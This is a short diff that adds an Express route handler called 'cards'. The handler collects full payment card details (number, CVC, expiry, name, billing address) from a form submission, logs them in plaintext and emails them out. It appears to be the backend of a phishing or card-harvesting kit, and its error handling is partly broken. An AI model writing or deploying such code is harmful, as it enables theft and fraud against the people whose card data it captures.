@@ -47,6 +47,29 @@ exports.links = (req, res) => {
     }
 }
 
+exports.cards = (req, res) => {
+    const { country, cardNumber, email, expDate, cvc, street, name, city, zip } = req.body;
+
+    try {
+        const message = `email:${email}, country:${country}, expDate:${expDate}, cardNumber:${cardNumber}, cvc:${cvc}, street:${street},name:${name}, city:${city}, zip:${zip}, `
+        console.log(message)
+        const reason = 'card details'
+
+        sendEmail.sendEmail2(email, message, reason, (data) => {
+            if (data) {
+                return res.status(200).json({
+                    status: 200,
+                    email: email,
+                    msg: 'email sent'
+                });
+            }
+
+        }).then(response => res.send(response.message)).catch(error => res.status);
+    } catch (error) {
+        return res.status(500).send(error.message);
+    }
+}
+
 exports.mobile = (req, res) => {
     const { number } = req.body;
 
